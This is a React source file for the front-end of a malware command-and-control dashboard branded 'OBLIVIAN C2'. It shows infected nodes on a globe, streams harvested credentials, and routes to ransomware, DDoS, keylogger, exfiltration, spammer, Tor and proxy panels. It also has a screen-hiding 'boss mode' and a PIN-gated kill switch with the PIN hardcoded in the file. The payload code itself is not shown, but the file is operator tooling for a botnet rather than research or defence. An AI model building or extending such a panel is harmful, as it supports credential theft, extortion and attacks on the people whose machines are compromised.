import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useWebSocket } from "./hooks/useWebSocket";
import GlobeComponent from "./components/GlobeComponent";
import NodeStats from "./components/NodeStats";
import EvasionAnalysis from "./components/EvasionAnalysis";
import ControlPanel from "./components/ControlPanel";
import StatsOverview from "./components/StatsOverview";
import AIChat from "./components/AIChat";
import CredentialStream from "./components/CredentialStream";
import PdfUploader from "./components/PdfUploader";
import ParticleField from "./components/ParticleField";
import ActivityLog from "./components/ActivityLog";
import SynthBadge from "./components/SynthBadge";
import Netwatch from "./components/Netwatch";
import SignalMonitor from "./components/SignalMonitor";
import MutationTimeline from "./components/MutationTimeline";
import GlitchClock from "./components/GlitchClock";
import TabNav from "./components/TabNav";
import RansomwarePanel from "./components/RansomwarePanel";
import DDOSPanel from "./components/DDOSPanel";
import KeyloggerPanel from "./components/KeyloggerPanel";
import ProxyPanel from "./components/ProxyPanel";
import ExfilPanel from "./components/ExfilPanel";
import TorPanel from "./components/TorPanel";
import RotatingProxyPanel from "./components/RotatingProxyPanel";
import DocsPanel from "./components/DocsPanel";
import SpammerPanel from "./components/SpammerPanel";
import LoginScreen from "./components/LoginScreen";
import MemoryPanel from "./components/MemoryPanel";
import ToolsPanel from "./components/ToolsPanel";
import BossMode from "./components/BossMode";
import IPBadge from "./components/IPBadge";
import { API_URL } from "./config";

function useWindowSize() {
  const [size, setSize] = useState({ width: window.innerWidth });
  useEffect(() => {
    const onResize = () => setSize({ width: window.innerWidth });
    window.addEventListener("resize", onResize);
    return () => window.removeEventListener("resize", onResize);
  }, []);
  return size;
}

const LoadingScreen: React.FC = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    document.body.style.overflow = 'hidden';
    window.scrollTo(0, 0);
    return () => { document.body.style.overflow = ''; };
  }, []);

  useEffect(() => {
    const c = canvasRef.current; if (!c) return;
    const ctx = c.getContext("2d"); if (!ctx) return;
    const dpr = window.devicePixelRatio || 1;
    const w = window.innerWidth; const h = window.innerHeight;
    c.width = w * dpr; c.height = h * dpr; c.style.width = w + "px"; c.style.height = h + "px";
    ctx.scale(dpr, dpr);

    const particles: Array<{x: number; y: number; r: number; vx: number; vy: number; alpha: number; pulse: number; speed: number}> = [];
    for (let i = 0; i < 50; i++) {
      particles.push({
        x: Math.random() * w, y: Math.random() * h, r: 2 + Math.random() * 5,
        vx: (Math.random() - 0.5) * 0.25, vy: (Math.random() - 0.5) * 0.25 - 0.08,
        alpha: 0.06 + Math.random() * 0.16, pulse: Math.random() * Math.PI * 2,
        speed: 0.008 + Math.random() * 0.025,
      });
    }
    let t = 0;
    const draw = () => {
      t += 0.016;
      ctx.clearRect(0, 0, w, h);
      particles.forEach(p => {
        p.x += p.vx; p.y += p.vy; p.pulse += p.speed;
        if (p.x < -20) p.x = w + 20; if (p.x > w + 20) p.x = -20;
        if (p.y < -20) p.y = h + 20; if (p.y > h + 20) p.y = -20;
        const a = p.alpha + Math.sin(p.pulse) * 0.06;
        const grad = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.r * 3);
        grad.addColorStop(0, `rgba(0, 255, 136, ${a})`);
        grad.addColorStop(0.3, `rgba(0, 255, 136, ${a * 0.6})`);
        grad.addColorStop(1, "rgba(0, 255, 136, 0)");
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r * 3, 0, Math.PI * 2);
        ctx.fillStyle = grad; ctx.fill();
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(0, 255, 136, ${a + 0.08})`; ctx.fill();
      });
      requestAnimationFrame(draw);
    };
    const id = requestAnimationFrame(draw);
    return () => cancelAnimationFrame(id);
  }, []);

  return (<div style={{
    position: 'fixed', inset: 0, display: 'flex', flexDirection: 'column',
    alignItems: 'center', justifyContent: 'center', backgroundColor: '#06060e', zIndex: 9999,
  }}>
    <canvas ref={canvasRef} style={{ position: "absolute", inset: 0, zIndex: 0 }} />
    <ParticleField />
    <motion.div
      initial={{ opacity: 0, scale: 0.8 }}
      animate={{ opacity: 1, scale: 1 }}
      transition={{ duration: 0.6 }}
      style={{ textAlign: 'center', zIndex: 1 }}
    >
      <div style={{
        width: 80, height: 80, borderRadius: '50%',
        border: '3px solid rgba(0, 255, 136, 0.1)',
        borderTop: '3px solid #00ff88',
        animation: 'spin 1s linear infinite', margin: '0 auto 32px',
      }} />
      <h1 style={{ fontSize: 32, fontWeight: 700, color: '#00ff88',
        textShadow: '0 0 20px rgba(0, 255, 136, 0.4)',
        fontFamily: "'JetBrains Mono', monospace",
      }}>OBLIVIAN</h1>
      <p style={{
        color: '#444', fontSize: 13, marginTop: 8,
        fontFamily: "'JetBrains Mono', monospace",
        letterSpacing: 3, textTransform: 'uppercase',
      }}>Initializing C2 Network</p>
    </motion.div>
  </div>
);
};

const KillSwitchButton: React.FC<{
  showPin: boolean; pin: string; setPin: (v: string) => void;
  onCancel: () => void; onConfirm: () => void; onClick: () => void;
  clicks: number; burning: boolean;
}> = ({ showPin, pin, setPin, onCancel, onConfirm, onClick, clicks, burning }) => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const w = 260; const h = 72;

  useEffect(() => {
    const c = canvasRef.current; if (!c) return;
    const ctx = c.getContext("2d"); if (!ctx) return;
    const dpr = window.devicePixelRatio || 1;
    c.width = w * dpr; c.height = h * dpr; ctx.scale(dpr, dpr);
    let t = 0;
    const particles: Array<{x: number; y: number; vx: number; vy: number; life: number; alpha: number}> = [];

    const draw = () => {
      t += 0.016;
      ctx.clearRect(0, 0, w, h);

      // Speed scales with clicks
      const speed = clicks > 1 ? 5 : clicks > 0 ? 2.5 : 0.4;
      const intensityMul = clicks > 1 ? 3 : clicks > 0 ? 2 : 1;

      // ── Breathing background ──
      const breath = 0.03 + Math.sin(t * speed * 0.8) * 0.02;
      const baseAlpha = burning ? 0.3 : Math.min(0.25, breath * intensityMul);
      ctx.fillStyle = `rgba(255,20,20,${baseAlpha})`;
      ctx.fillRect(0, 0, w, h);

      // ── Radiating rings from center (radar style) ──
      const cx = w / 2, cy = h / 2;
      const maxR = Math.sqrt(cx * cx + cy * cy);
      for (let ring = 0; ring < 4; ring++) {
        const phase = ((t * speed + ring * 1.2) % 3);
        const radius = 5 + phase * (maxR / 3);
        const ringAlpha = Math.max(0, (0.4 - phase * 0.13) * intensityMul);
        ctx.beginPath();
        ctx.arc(cx, cy, radius, 0, Math.PI * 2);
        ctx.strokeStyle = `rgba(255,71,87,${ringAlpha * (clicks > 0 ? 0.8 : 0.6)})`;
        ctx.lineWidth = clicks > 1 ? 3 : clicks > 0 ? 2.5 : 1.5;
        ctx.stroke();
      }

      // ── Border pulse ──
      const borderAlpha = Math.min(0.35, (0.12 + Math.sin(t * speed * 1.5) * 0.06) * intensityMul);
      ctx.strokeStyle = `rgba(255,71,87,${borderAlpha})`;
      ctx.lineWidth = 1.5;
      ctx.strokeRect(1, 1, w - 2, h - 2);

      // ── Hazard corner marks ──
      const cornerLen = 10;
      const ca = Math.min(0.45, (0.2 + Math.sin(t * speed * 1.5) * 0.12) * intensityMul);
      ctx.strokeStyle = `rgba(255,71,87,${ca})`;
      ctx.lineWidth = 1;
      ctx.beginPath(); ctx.moveTo(3, 3 + cornerLen); ctx.lineTo(3, 3); ctx.lineTo(3 + cornerLen, 3); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(w - 3 - cornerLen, 3); ctx.lineTo(w - 3, 3); ctx.lineTo(w - 3, 3 + cornerLen); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(3, h - 3 - cornerLen); ctx.lineTo(3, h - 3); ctx.lineTo(3 + cornerLen, h - 3); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(w - 3 - cornerLen, h - 3); ctx.lineTo(w - 3, h - 3); ctx.lineTo(w - 3, h - 3 - cornerLen); ctx.stroke();

      // ── Ember particles ──
      const spawnRate = Math.min(0.6, 0.15 * intensityMul * 0.5);
      if (Math.random() < spawnRate) {
        particles.push({
          x: Math.random() * w, y: h + 4,
          vx: (Math.random() - 0.5) * 0.3,
          vy: -(0.2 + Math.random() * 0.4 * intensityMul),
          life: 1, alpha: 0.15 + Math.random() * 0.25,
        });
      }
      for (let i = particles.length - 1; i >= 0; i--) {
        const p = particles[i]; p.x += p.vx; p.y += p.vy; p.life -= 0.008;
        if (p.life <= 0) { particles.splice(i, 1); continue; }
        ctx.beginPath(); ctx.arc(p.x, p.y, 1.2 * p.life, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(255,120,80,${p.alpha * p.life})`;
        ctx.fill();
      }
      if (particles.length > 15) particles.splice(0, particles.length - 15);

      // ── Text ──
      ctx.font = 'bold 13px "JetBrains Mono", monospace';
      ctx.textAlign = "center"; ctx.textBaseline = "middle";
      const glowBlur = clicks > 1 ? 18 + Math.sin(t * speed * 2) * 5 : clicks > 0 ? 12 + Math.sin(t * speed) * 4 : 6 + Math.sin(t * 1.5) * 3;
      const text = burning ? "☢️ NUKING... ☢️" : clicks > 1 ? "☢️ CONFIRM ☢️" : clicks > 0 ? `☢️ ${3 - clicks} MORE ☢️` : "☢️ KILL SWITCH ☢️";
      const tColor = burning ? "#ffd700" : clicks > 1 ? "#ff4444" : clicks > 0 ? "#ff6666" : "#ff4757";
      ctx.fillStyle = tColor; ctx.shadowColor = tColor; ctx.shadowBlur = glowBlur;
      ctx.fillText(text, w / 2, h / 2);
      ctx.shadowBlur = 0;
      ctx.fillStyle = "#ffffff"; ctx.globalAlpha = 0.7;
      ctx.fillText(text, w / 2, h / 2);
      ctx.globalAlpha = 1;

      ctx.font = '8px "JetBrains Mono", monospace';
      ctx.fillStyle = `rgba(255,71,87,${Math.min(0.8, (0.3 + Math.sin(t * speed) * 0.2) * intensityMul)})`;
      ctx.shadowColor = "#ff4757";
      ctx.shadowBlur = glowBlur * 0.5;
      ctx.fillText(clicks > 1 ? "LAST WARNING" : clicks > 0 ? "PIN REQUIRED" : "3-CLICK TO ARM", w / 2, h / 2 + 18);
      ctx.shadowBlur = 0;

      requestAnimationFrame(draw);
    };
    const id = requestAnimationFrame(draw);
    return () => cancelAnimationFrame(id);
  }, [clicks, burning]);

  return (
    <div style={{ position: "relative", width: w, height: h }}>
      {showPin ? (
        <div style={{ display: "flex", gap: 4, alignItems: "center", padding: "8px 12px", background: "rgba(6,6,14,0.8)", borderRadius: 8, border: "1px solid rgba(255,71,87,0.2)", height: h, boxSizing: "border-box", width: w }}>
          <input autoFocus style={{ width: 80, padding: "6px 8px", background: "rgba(6,6,14,0.8)", border: "1px solid rgba(255,71,87,0.3)", borderRadius: 6, color: "#ff4757", fontFamily: "'JetBrains Mono', monospace", fontSize: 18, outline: "none", textAlign: "center", letterSpacing: "6px" }}
            type="text" maxLength={4} value={pin} onChange={e => setPin(e.target.value)} onKeyDown={e => e.key === "Enter" && onConfirm()} placeholder="0000" />
          <motion.button whileTap={{ scale: 0.9 }} onClick={onConfirm} style={{ padding: "6px 10px", background: "#ff4757", border: "1px solid rgba(255,71,87,0.3)", borderRadius: 6, color: "#fff", cursor: "pointer", fontWeight: 700, fontSize: 10, fontFamily: "'JetBrains Mono', monospace", whiteSpace: "nowrap" }}>KILL</motion.button>
          <span onClick={(e) => { e.stopPropagation(); onCancel(); }} style={{ color: "#ff4757", cursor: "pointer", fontSize: 16, padding: "4px 8px", marginLeft: 4, borderRadius: 4, background: "rgba(255,71,87,0.08)" }}>✕</span>
        </div>
      ) : (
        <canvas
          key={String(showPin) + String(clicks)}
          ref={canvasRef}
          onClick={(e) => { e.stopPropagation(); onClick(); }}
          style={{
            width: w, height: h, borderRadius: 8, cursor: "pointer",
            border: "1px solid rgba(255,71,87,0.2)",
            boxShadow: clicks > 0 ? "0 0 25px rgba(255,71,87,0.25), 0 0 8px rgba(255,71,87,0.1)" : "0 0 12px rgba(255,71,87,0.08), 0 0 4px rgba(255,71,87,0.04)",
          }}
        />
      )}
    </div>
  );
};

const OfflineBanner: React.FC<{ onRetry: () => void }> = ({ onRetry }) => (
  <motion.div
    initial={{ y: -40, opacity: 0 }}
    animate={{ y: 0, opacity: 1 }}
    style={{
      display: 'flex', alignItems: 'center', gap: 10,
      padding: '10px 20px', margin: '0 24px 12px',
      background: 'rgba(255, 71, 87, 0.06)',
      border: '1px solid rgba(255, 71, 87, 0.2)',
      borderRadius: 10, fontSize: 12,
    }}
  >
    <span style={{
      width: 8, height: 8, borderRadius: '50%',
      backgroundColor: '#ff4757', animation: 'pulse 2s infinite',
    }} />
    <span style={{ color: '#ff4757', fontWeight: 600 }}>OFFLINE</span>
    <span style={{ color: '#666' }}>C2 server unreachable</span>
    <button
      onClick={onRetry}
      style={{
        marginLeft: 'auto', padding: '4px 14px',
        background: 'transparent', color: '#ff4757',
        border: '1px solid rgba(255, 71, 87, 0.3)', borderRadius: 6,
        fontSize: 11, cursor: 'pointer',
      }}
    >Retry</button>
  </motion.div>
);

function GlobeWheelWrapper({ children }: { children: React.ReactNode }) {
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const onWheel = (e: WheelEvent) => {
      if (e.shiftKey) {
        e.preventDefault(); // stop page scroll, OrbitControls handles zoom
      } else {
        e.stopPropagation(); // stop OrbitControls, page scrolls naturally
      }
    };
    el.addEventListener('wheel', onWheel, { passive: false, capture: true });
    return () => el.removeEventListener('wheel', onWheel);
  }, []);
  return <div ref={ref}>{children}</div>;
}


const cardVariants = {
  hidden: { opacity: 0, y: 20 },
  visible: (i: number) => ({
    opacity: 1, y: 0,
    transition: { delay: i * 0.06, duration: 0.45, ease: [0.25, 0.46, 0.45, 0.94] as [number, number, number, number] },
  }),
};

const App: React.FC = () => {
  const { data, loading, connected, usingMock, reconnect, sendMessage } = useWebSocket();
  const [ready, setReady] = useState(false);
  const { width } = useWindowSize();
  const isMobile = width < 900;
  const isSmall = width < 1200;
  const hasLoadedOnce = useRef(false);
  const scrollLocked = useRef(false);
  const [activeTab, setActiveTab] = useState("dashboard");
  const [burnClicks, setBurnClicks] = useState(0);
  const [bossMode, setBossMode] = useState(false);
  const [showBurnPin, setShowBurnPin] = useState(false);
  const [burnPin, setBurnPin] = useState("");
  const [burning, setBurning] = useState(false);
  const [loggedIn, setLoggedIn] = useState(() => {
    try {
      const auth = localStorage.getItem("virus_auth");
      if (auth) {
        const parsed = JSON.parse(auth);
        return (Date.now() - parsed.ts) < 24 * 60 * 60 * 1000;
      }
    } catch {}
    return false;
  });

  useEffect(() => {
    if (!loading && data && !hasLoadedOnce.current) {
      hasLoadedOnce.current = true;
      const t = setTimeout(() => setReady(true), 400);
      return () => clearTimeout(t);
    }
  }, [loading, data]);

  // Pin scroll to top once after first load — never again
  useEffect(() => {
    if (ready && !scrollLocked.current) {
      scrollLocked.current = true;
      window.scrollTo({ top: 0, behavior: 'instant' as ScrollBehavior });
    }
  }, [ready]);

  // Boss mode keyboard shortcut: backtick ` toggles
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "`" || e.key === "~") setBossMode(prev => !prev);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, []);

  // Show login gate if not authenticated
  if (!loggedIn) {
    return <LoginScreen onLogin={() => setLoggedIn(true)} />;
  }

  // Block re-showing loading screen after first successful render
  if ((loading || !data || !ready) && !hasLoadedOnce.current) {
    return <LoadingScreen />;
  }

  const confirmBurn = async () => {
    if (burnPin !== "1381") { setShowBurnPin(false); setBurnPin(""); return; }
    setBurning(true); setShowBurnPin(false); setBurnPin("");
    try {
      await fetch(API_URL + "/api/kill-switch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: "1381" }),
      });
    } catch {}
    // Wait briefly then log out
    setTimeout(() => {
      localStorage.removeItem("virus_auth");
      setLoggedIn(false);
      setBurning(false);
    }, 2000);
  };

  const stats = data.stats || { total_nodes: 0, active_nodes: 0, credentials: 0 };

  return (
    <div style={styles.page}>
      <ParticleField />

      {bossMode && <BossMode onExit={() => setBossMode(false)} />}

      <AnimatePresence>
        {usingMock && <OfflineBanner onRetry={reconnect} />}
      </AnimatePresence>

      {/* ── Header ─────────────────────────────── */}
      <motion.header
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        style={{...styles.header, margin: isMobile ? '0 10px 2px' : '0 20px 2px', padding: isMobile ? '0' : '0'}}
      >
        {/* ── Full-width globe with overlays ── */}
        <GlobeWheelWrapper>
        <div style={{ position: "relative", height: 380 }}>
          <div style={{ width: "100%", height: "100%", borderRadius: 8, overflow: "hidden" }}>
            <GlobeComponent nodes={data.nodes || []} compact />
          </div>
          {/* Title overlay top-left */}
          <div style={{ position: "absolute", top: 10, left: 14, zIndex: 5000 }}>
            <div style={{ display: 'flex', alignItems: 'baseline', gap: 10 }}>
              <h1 style={{ margin: 0, color: '#00ff88', fontSize: 26, fontWeight: 700, fontFamily: "'JetBrains Mono', monospace", textShadow: '0 0 12px rgba(0,255,136,0.3)' }}>OBLIVIAN</h1>
              <span style={{ color: '#334', fontSize: 10, fontFamily: "'JetBrains Mono', monospace" }}>C2 v2.0</span>
            </div>
            <div style={{ color: '#00ff8877', fontSize: 11, fontFamily: "'Inter', sans-serif", fontStyle: 'italic', letterSpacing: 2, fontWeight: 300 }}>Fear the ones who own the dark</div>
          </div>
          {/* Badges overlay top-right */}
          <div style={{ position: "absolute", top: 6, right: 6, zIndex: 5000, display: "flex", flexDirection: "column", gap: 3, alignItems: "flex-end" }}>
            <SynthBadge connected={connected} activeNodes={stats.active_nodes} />
            <IPBadge />
            <KillSwitchButton
              key={`ks-${showBurnPin}-${burnClicks}`}
              showPin={showBurnPin} pin={burnPin} setPin={setBurnPin}
              onCancel={() => { setShowBurnPin(false); setBurnPin(""); setBurnClicks(0); }}
              onConfirm={confirmBurn}
              onClick={() => {
                if (burning) return;
                const next = burnClicks + 1;
                if (next >= 3) { setShowBurnPin(true); setBurnClicks(0); }
                else { setBurnClicks(next); }
              }}
              clicks={burnClicks} burning={burning}
            />
          </div>
        </div>
        </GlobeWheelWrapper>

        <div style={styles.statsRow}>
          <StatsOverview
            data={stats}
            bytes_harvested={data.bytes_harvested}
            last_harvest={data.last_harvest}
            last_heartbeat={data.last_heartbeat}
          />
        </div>
        <div style={styles.clockRow}>
          <GlitchClock />
        </div>
        {/* Bottom-left buttons — logout + boss mode */}
        <div style={{ position: "absolute", bottom: 0, left: 12, zIndex: 9000, display: "flex", gap: 6 }}>
          <motion.button
            onClick={() => { localStorage.removeItem("virus_auth"); setLoggedIn(false); }}
            whileHover={{ scale: 1.04, borderColor: "rgba(255,71,87,0.5)" }}
            whileTap={{ scale: 0.96 }}
            style={{
              color: "#ff4757", fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              background: "rgba(255,71,87,0.08)", backdropFilter: "blur(8px)",
              border: "1px solid rgba(255,71,87,0.25)",
              borderRadius: 6, padding: "7px 18px", cursor: "pointer", fontWeight: 700,
              letterSpacing: 1.5, transition: "all 0.2s",
            }}
            initial={{ opacity: 0.7 }}
            animate={{ opacity: [0.7, 1, 0.7] }}
            transition={{ duration: 3, repeat: Infinity }}
          >LOGOUT</motion.button>
          <motion.button
            onClick={() => setBossMode(prev => !prev)}
            whileHover={{ scale: 1.04, borderColor: "rgba(37,99,235,0.5)" }}
            whileTap={{ scale: 0.96 }}
            style={{
              color: "#2563eb", fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              background: "rgba(37,99,235,0.08)", backdropFilter: "blur(8px)",
              border: "1px solid rgba(37,99,235,0.25)",
              borderRadius: 6, padding: "7px 18px", cursor: "pointer", fontWeight: 700,
              letterSpacing: 1.5, transition: "all 0.2s",
            }}
            initial={{ opacity: 0.7 }}
            animate={{ opacity: [0.7, 1, 0.7] }}
            transition={{ duration: 3, repeat: Infinity }}
          >BOSS MODE</motion.button>
        </div>
      </motion.header>

      {/* ── Tab Navigation ─────────────────────── */}
      <TabNav active={activeTab} onChange={setActiveTab} />

      {/* ── AI Command Center ── always visible ──── */}
      <motion.div
        custom={2} variants={cardVariants} initial="hidden" animate="visible"
        style={{...styles.aiSection, margin: isMobile ? '0 10px 6px' : '0 20px 6px'}}
      >
        <AIChat />
      </motion.div>

      {/* ── Dashboard Conditional ──────────────── */}
      {activeTab === "dashboard" && (<>      
      {/* ── Activity Ticker ────────────────────── */}
      <ActivityLog />

      {/* ── Signal Waveform ────────────────────── */}
      <motion.div
        custom={1} variants={cardVariants} initial="hidden" animate="visible"
        style={{...styles.fullSection, margin: isMobile ? '0 10px 6px' : '0 20px 6px'}}
      >
        <SignalMonitor />
      </motion.div>

      {/* ── 4-Column Telemetry Grid ────────────── */}
      <div style={{...styles.grid4, gridTemplateColumns: isMobile ? 'repeat(2, 1fr)' : isSmall ? 'repeat(2, 1fr)' : 'repeat(4, 1fr)'}}>
        <motion.div custom={3} variants={cardVariants} initial="hidden" animate="visible" style={styles.panel}>
          <CredentialStream data={data.credentials} />
        </motion.div>
        <motion.div custom={4} variants={cardVariants} initial="hidden" animate="visible" style={styles.panel}>
          <EvasionAnalysis data={data.evasion} />
        </motion.div>
        <motion.div custom={5} variants={cardVariants} initial="hidden" animate="visible" style={styles.panel}>
          <NodeStats data={data.nodes} />
        </motion.div>
        <motion.div custom={6} variants={cardVariants} initial="hidden" animate="visible" style={styles.panel}>
          <ControlPanel
            sendMessage={sendMessage}
            simulationEnabled={data.simulation_enabled === true}
            data={data}
          />
        </motion.div>
      </div>

      {/* ── Full-Width Sections ──────────────────── */}
      <motion.div custom={7} variants={cardVariants} initial="hidden" animate="visible" style={{...styles.fullSection, margin: isMobile ? '0 10px 6px' : '0 20px 6px'}}>
        <PdfUploader sendMessage={sendMessage} />
      </motion.div>
      <motion.div custom={8} variants={cardVariants} initial="hidden" animate="visible" style={{...styles.fullSection, margin: isMobile ? '0 10px 6px' : '0 20px 6px'}}>
        <Netwatch />
      </motion.div>

      <motion.div custom={9} variants={cardVariants} initial="hidden" animate="visible" style={{...styles.fullSection, margin: isMobile ? '0 10px 6px' : '0 20px 6px'}}>
        <MutationTimeline />
      </motion.div>
      </>)}

      {activeTab === "ransom" && <RansomwarePanel />}
      {activeTab === "ddos" && <DDOSPanel />}
      {activeTab === "keylog" && <KeyloggerPanel />}
      {activeTab === "proxy" && <ProxyPanel />}
      {activeTab === "rotating" && <RotatingProxyPanel />}
      {activeTab === "exfil" && <ExfilPanel />}
      {activeTab === "tor" && <TorPanel />}
      {activeTab === "spammer" && <SpammerPanel />}
      {activeTab === "docs" && <DocsPanel />}
      {activeTab === "memory" && <MemoryPanel />}
      {activeTab === "tools" && <ToolsPanel />}

      {/* ── Footer ─────────────────────────────── */}
      <motion.footer
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 1 }}
        style={styles.footer}
      >
        <span style={{ color: '#333' }}>OBLIVIAN C2 v2.0</span>
        <span style={styles.footerDot}>|</span>
        <span style={{ color: '#444' }}>{stats.credentials} harvested</span>
        <span style={styles.footerDot}>|</span>
        <span style={{ color: '#444' }}>{stats.active_nodes} active</span>
      </motion.footer>
    </div>
  );
};

const styles: Record<string, React.CSSProperties> = {
  page: {
    position: 'relative',
    fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif",
    backgroundColor: '#06060e',
    color: '#e0e0e0',
    minHeight: '100vh',
    paddingBottom: 40,
  },
  header: {
    position: 'relative', zIndex: 10,
    margin: '0 20px 6px',
    padding: '16px 20px 12px',
    background: 'rgba(12, 14, 28, 0.7)',
    backdropFilter: 'blur(20px)',
    borderRadius: 12,
    border: '1px solid rgba(0, 255, 136, 0.12)',
    boxShadow: '0 4px 40px rgba(0, 0, 0, 0.3)',
  },
  headerTop: {
    display: 'flex', alignItems: 'center',
    justifyContent: 'space-between', marginBottom: 2,
  },
  titleGroup: {
    display: 'flex', flexDirection: 'column' as const, gap: 2, alignItems: 'flex-start',
  },
  title: {
    margin: 0, color: '#00ff88', fontSize: 28,
    fontWeight: 700, letterSpacing: '-0.5px',
    fontFamily: "'JetBrains Mono', monospace",
  },
  badge: {
    color: '#333', fontSize: 11,
    fontFamily: "'JetBrains Mono', monospace",
  },
  tagline: {
    color: '#00ff8844', fontSize: 10,
    fontFamily: "'Inter', sans-serif", fontStyle: 'italic' as const,
    letterSpacing: 2, marginTop: 2, fontWeight: 300,
  },
  statsRow: {
    display: 'flex',
    justifyContent: 'center',
  },
  clockRow: {
    display: 'flex',
    justifyContent: 'center',
    marginTop: 6,
  },
  aiSection: {
    position: 'relative', zIndex: 10,
    margin: '0 20px 6px',
  },
  grid4: {
    display: 'grid',
    gridTemplateColumns: 'repeat(4, 1fr)',
    gap: 6,
    margin: '0 20px 6px',
    position: 'relative', zIndex: 10,
  },
  grid3: {
    display: 'grid',
    gridTemplateColumns: 'repeat(3, 1fr)',
    gap: 6,
    margin: '0 20px 6px',
    position: 'relative', zIndex: 10,
  },
  panel: {
    display: 'flex',
    flexDirection: 'column',
    minHeight: 340,
  },
  fullSection: {
    position: 'relative' as const, zIndex: 10,
    margin: '0 20px 6px',
  },
  footer: {
    textAlign: 'center', padding: '10px 20px',
    fontSize: 11, display: 'flex',
    justifyContent: 'center', gap: 10,
    position: 'relative', zIndex: 10,
  },
  footerDot: {
    color: '#1a2a1a',
  },
};

export default App;
